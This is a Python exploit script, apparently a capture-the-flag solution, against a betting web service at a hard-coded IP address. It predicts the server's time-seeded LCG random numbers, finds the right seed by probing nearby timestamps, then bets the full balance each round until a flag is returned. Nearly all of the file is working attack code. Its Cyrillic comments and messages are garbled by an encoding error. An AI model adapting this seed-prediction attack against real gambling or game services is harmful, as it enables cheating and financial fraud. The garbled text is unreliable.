import requests
import time
import sys

BASE_URL = "http://16.16.128.251:63417"
TARGET_BALANCE = 1000000000


# --- LCG –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä ---
def get_next_seed(seed):
    return (1103515245 * seed + 12345) % (2 ** 31)


def get_guess_from_seed(seed):
    return (seed % 10) + 1


# --------------------

def run_exploit():
    print("[+] –ü—ã—Ç–∞—é—Å—å —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–º—è...")
    base_seed = int(time.time())

    try:
        r = requests.get(f"{BASE_URL}/generate_token")
        token_text = r.text
        token = token_text.split('is: ')[1].split('\n')[0]
    except requests.exceptions.RequestException as e:
        print(f"[X] –ù–µ –º–æ–≥—É –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É: {e}")
        sys.exit(1)

    print(f"[+] –ü–æ–ª—É—á–µ–Ω —Ç–æ–∫–µ–Ω: {token}")
    print(f"[+] –õ–æ–∫–∞–ª—å–Ω—ã–π base_seed: {base_seed}. –¢–µ—Å—Ç–∏—Ä—É—é...")

    synced_seed_state = 0
    current_balance = 1000
    headers = {'Authorization': token, 'Content-Type': 'application/json'}

    # --- –®–∞–≥ 1: –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è ---
    for offset in [-1, 0, 1]:
        test_seed = base_seed + offset

        first_seed_state = get_next_seed(test_seed)
        predicted_guess = get_guess_from_seed(first_seed_state)

        print(f"[?] –¢–µ—Å—Ç–∏—Ä—É—é seed: {test_seed} (–ø—Ä–µ–¥—Å–∫–∞–∑–∞–Ω–∏–µ: {predicted_guess})...")

        try:
            r = requests.post(f"{BASE_URL}/play", headers=headers, json={"bet": 1, "guess": predicted_guess})
            result = r.json()
        except requests.exceptions.RequestException as e:
            print(f"[X] –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –∏–≥—Ä—ã: {e}")
            continue

        if result.get("win"):
            print(f"[!!!] –°–ò–ù–•–†–û–ù–ò–ó–ò–†–û–í–ê–ù–û! –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π seed: {test_seed}")
            print(f"[+] –°–µ—Ä–≤–µ—Ä –≤—ã–±—Ä–æ—Å–∏–ª {result.get('randomNumber')}, –º—ã –≤—ã–∏–≥—Ä–∞–ª–∏!")
            synced_seed_state = first_seed_state
            current_balance = 1001  # 1000 + 1 (–≤—ã–∏–≥—Ä—ã—à)
            break
        else:
            print(f"[-] ...–Ω–µ—É–¥–∞—á–∞ –¥–ª—è {test_seed}. –°–µ—Ä–≤–µ—Ä: {result.get('randomNumber')}")

    if synced_seed_state == 0:
        print("[X] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞—Ç—å seed. –ü–æ–ø—Ä–æ–±—É–π –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç –µ—â–µ —Ä–∞–∑.")
        return

    # --- –®–∞–≥ 2: All-in ---
    current_seed = synced_seed_state

    while current_balance < TARGET_BALANCE:
        current_seed = get_next_seed(current_seed)
        guess = get_guess_from_seed(current_seed)
        bet = current_balance

        print(f"[+] –ë–∞–ª–∞–Ω—Å: ${current_balance}. –°—Ç–∞–≤–ª—é ${bet} –Ω–∞ {guess}...")

        try:
            r = requests.post(f"{BASE_URL}/play", headers=headers, json={"bet": bet, "guess": guess})
            result = r.json()
        except Exception as e:
            print(f"[X] –û—à–∏–±–∫–∞: {e}")
            time.sleep(1)
            continue

        if result.get("win"):
            current_balance += bet
            print(f"[+] –í–´–ò–ì–†–´–®! –°–µ—Ä–≤–µ—Ä: {result.get('randomNumber')}. –ù–æ–≤—ã–π –±–∞–ª–∞–Ω—Å: ${current_balance}")
            if result.get("flag"):
                print("\n[üèÜüèÜüèÜ] –¶–ï–õ–¨ –î–û–°–¢–ò–ì–ù–£–¢–ê! [üèÜüèÜüèÜ]")
                print(f"[+] –§–ª–∞–≥: {result.get('flag')}")
                return
        else:
            print(f"[X] –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê! –ü—Ä–µ–¥—Å–∫–∞–∑–∞–Ω–∏–µ {guess} –Ω–µ–≤–µ—Ä–Ω–æ, —Å–µ—Ä–≤–µ—Ä: {result.get('randomNumber')}")
            return


if __name__ == "__main__":
    run_exploit()